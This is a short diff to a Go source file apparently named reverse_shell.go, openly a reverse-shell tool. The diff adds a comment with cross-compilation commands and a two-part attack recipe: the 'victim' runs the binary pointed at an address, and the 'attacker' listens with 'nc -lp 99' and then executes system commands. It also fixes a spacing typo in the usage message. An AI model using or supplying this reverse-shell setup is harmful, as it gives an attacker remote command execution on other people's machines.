@@ -13,9 +13,24 @@ var (
 	remoteIp string
 )
 
+/*
+go cross compiling
+ref: https://www.jianshu.com/p/3ff21f818182
+
+windows cross compile linux elf, default is windows exe
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build reverse_shell.go
+
+victim:
+./reverse_shell 127.0.0.1:99
+
+attacker:
+nc -lp 99
+after connection, attack can exec system command
+*/
+
 func main() {
 	if len(os.Args) < 2 {
-		fmt.Println("Usage: " + os.Args[0] + "<remoteAddress>")
+		fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
 		os.Exit(1)
 	}
 
